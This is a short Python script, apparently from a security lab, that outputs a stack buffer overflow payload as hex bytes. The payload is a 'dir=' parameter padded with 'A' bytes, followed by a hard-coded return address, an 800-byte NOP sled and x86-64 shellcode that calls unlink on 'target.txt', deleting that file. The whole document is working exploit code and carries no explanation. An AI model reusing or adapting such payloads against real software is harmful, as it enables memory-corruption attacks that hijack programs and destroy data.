#!/usr/bin/python
import sys
#dir=AAAAA...
str = "64 69 72 3d 41 41 41 41 "
i = 0
while i < 144:
    str += "41 "
    i += 1
#return address
str += "80 d0 ff ff ff 7f 00 00 "
#nop sled
i = 0
while i < 800:
    str += "90 "
    i += 1
#exploit code
str += "48 8d 3d 09 00 00 00 48 c7 c0 57 00 00 00 0f 05 "
#target.txt
str += "74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00"
#print out byte sequence
sys.stdout.write(str)
